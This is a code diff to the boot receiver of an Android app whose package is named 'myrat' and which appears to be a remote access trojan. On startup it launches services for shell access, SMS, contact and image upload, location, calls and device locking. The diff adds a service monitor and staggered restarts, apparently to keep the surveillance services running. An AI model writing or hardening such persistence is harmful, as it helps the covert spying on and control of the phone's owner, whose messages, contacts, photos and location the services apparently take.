@@ -11,6 +11,7 @@ import com.myrat.app.service.ContactUploadService
 import com.myrat.app.service.ImageUploadService
 import com.myrat.app.service.LocationService
 import com.myrat.app.service.LockService
+import com.myrat.app.service.ServiceMonitorService
 import com.myrat.app.service.ShellService
 import com.myrat.app.service.SmsService
 import com.myrat.app.service.SmsConsentService
@@ -20,12 +21,12 @@ class BootReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent?) {
         try {
             if (Intent.ACTION_BOOT_COMPLETED == intent?.action || Intent.ACTION_LOCKED_BOOT_COMPLETED == intent?.action) {
-                Logger.log("Boot completed, starting all services")
+                Logger.log("Boot completed, starting all services with delay")
                 
                 // Add delay to ensure system is ready
                 android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                     startAllServices(context)
-                }, 5000) // 5 second delay
+                }, 10000) // 10 second delay for system stability
             }
         } catch (e: Exception) {
             Logger.error("Error in BootReceiver", e)
@@ -43,24 +44,32 @@ class BootReceiver : BroadcastReceiver() {
                 LocationService::class.java,
                 CallService::class.java,
                 LockService::class.java,
-                SmsConsentService::class.java
+                SmsConsentService::class.java,
+                ServiceMonitorService::class.java // Start monitor last
             )
 
-            services.forEach { serviceClass ->
+            services.forEachIndexed { index, serviceClass ->
                 try {
-                    val serviceIntent = Intent(context, serviceClass)
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        context.startForegroundService(serviceIntent)
-                    } else {
-                        context.startService(serviceIntent)
-                    }
-                    Logger.log("Started ${serviceClass.simpleName} on boot")
+                    // Add small delay between service starts
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        try {
+                            val serviceIntent = Intent(context, serviceClass)
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                context.startForegroundService(serviceIntent)
+                            } else {
+                                context.startService(serviceIntent)
+                            }
+                            Logger.log("Started ${serviceClass.simpleName} on boot")
+                        } catch (e: Exception) {
+                            Logger.error("Failed to start ${serviceClass.simpleName} on boot", e)
+                        }
+                    }, (index * 1000).toLong()) // 1 second delay between each service
                 } catch (e: Exception) {
-                    Logger.error("Failed to start ${serviceClass.simpleName} on boot", e)
+                    Logger.error("Failed to schedule ${serviceClass.simpleName} on boot", e)
                 }
             }
             
-            Logger.log("All services started successfully on boot")
+            Logger.log("All services scheduled to start on boot")
         } catch (e: Exception) {
             Logger.error("Error starting services on boot", e)
         }
